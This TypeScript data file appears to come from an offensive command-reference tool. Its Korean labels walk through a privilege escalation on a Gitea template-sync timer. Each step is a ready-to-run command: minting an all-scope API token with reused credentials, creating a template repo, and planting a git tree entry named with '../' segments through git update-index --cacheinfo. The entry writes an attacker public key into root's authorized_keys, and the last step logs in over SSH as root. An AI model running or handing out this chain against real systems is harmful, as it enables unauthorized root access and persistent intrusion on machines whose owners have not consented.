// Same reference-only shape as mcpExploitCommands.ts/k8sPivotCommands.ts -- run
// from a shell already on the box (e.g. after SSH password-reuse). Targets a
// root-owned sync timer that processes Gitea "template" repos via git ls-tree
// with no path sanitization: a tree entry named with "../" segments escapes
// the intended output directory when the service writes it with
// os.path.join(). git won't let you `git add` a path containing ".." through
// a normal working directory, so the tree entry is injected directly into
// the index with `git update-index --cacheinfo`, bypassing that check.
export type GiteaCommand = { label: string; command: string; note?: string };
export type GiteaCategory = { id: string; title: string; description: string; commands: GiteaCommand[] };

export const giteaTemplateSyncCategories: GiteaCategory[] = [
  {
    id: "gitea-api-token",
    title: "Gitea API 토큰 발급",
    description: "이미 확보한 자격증명으로 Gitea REST API 토큰을 발급받습니다. {GITEA_URL}은 " +
      "보통 http://localhost:3000처럼 이 셸 안에서만 열려 있습니다.",
    commands: [
      { label: "API 토큰 생성",
        command: "curl -sk -X POST {GITEA_URL}/api/v1/users/{USER}/tokens " +
          "-H 'Content-Type: application/json' -u '{USER}:{PASSWORD}' " +
          "-d '{\"name\":\"pwn\",\"scopes\":[\"all\"]}'",
        note: "응답의 sha1 값을 아래 {TOKEN}에 씁니다." },
    ],
  },
  {
    id: "template-repo-create",
    title: "template 레포 생성",
    description: "동기화 타이머가 처리 대상으로 훑는 \"template\" 표시가 된 레포를 새로 만듭니다.",
    commands: [
      { label: "레포 생성",
        command: "curl -sk -X POST {GITEA_URL}/api/v1/user/repos -H 'Authorization: token {TOKEN}' " +
          "-H 'Content-Type: application/json' -d '{\"name\":\"{REPO}\",\"auto_init\":true}'" },
      { label: "template 레포로 표시",
        command: "curl -sk -X PATCH {GITEA_URL}/api/v1/repos/{USER}/{REPO} " +
          "-H 'Authorization: token {TOKEN}' -H 'Content-Type: application/json' " +
          "-d '{\"template\":true}'" },
    ],
  },
  {
    id: "malicious-tree-push",
    title: "path traversal 트리 만들어 push",
    description: "SSH 공개키를 담은 블롭을 만들고, 정상적인 git add로는 만들 수 없는 " +
      "\"../\" 경로를 가진 트리 항목으로 인덱스에 직접 끼워 넣은 뒤 push합니다. " +
      "동기화 스크립트가 이 경로를 그대로 os.path.join()에 넘기면 root의 authorized_keys가 됩니다.",
    commands: [
      { label: "로컬 레포 준비 + 블롭 생성",
        command: "git init /tmp/pwn && cd /tmp/pwn && " +
          "echo '{ATTACKER_PUBKEY}' > pubkey && BLOB=$(git hash-object -w pubkey) && echo $BLOB" },
      { label: "traversal 경로로 인덱스에 직접 삽입",
        command: "cd /tmp/pwn && git update-index --add --cacheinfo " +
          "100644,$(git hash-object -w pubkey),../../../../../root/.ssh/authorized_keys",
        note: "일반 파일시스템 경로가 아니라 git 트리 항목 이름 자체에 \"..\"이 들어가는 것이라 " +
          "mkdir/cd로는 흉내낼 수 없습니다 -- update-index --cacheinfo로만 됩니다." },
      { label: "커밋 + push",
        command: "cd /tmp/pwn && git commit -m sync && " +
          "git remote add origin {GITEA_URL}/{USER}/{REPO}.git && " +
          "git -c http.extraHeader=\"Authorization: token {TOKEN}\" push -u origin master" },
    ],
  },
  {
    id: "wait-and-root-ssh",
    title: "타이머 대기 후 root SSH",
    description: "동기화 타이머 주기(보통 60초)만큼 기다린 뒤 심어둔 개인키로 root 접속을 시도합니다.",
    commands: [
      { label: "60초 대기", command: "sleep 60" },
      { label: "root로 SSH 접속", command: "ssh -i {ATTACKER_PRIVKEY_PATH} root@{TARGET}" },
    ],
  },
];
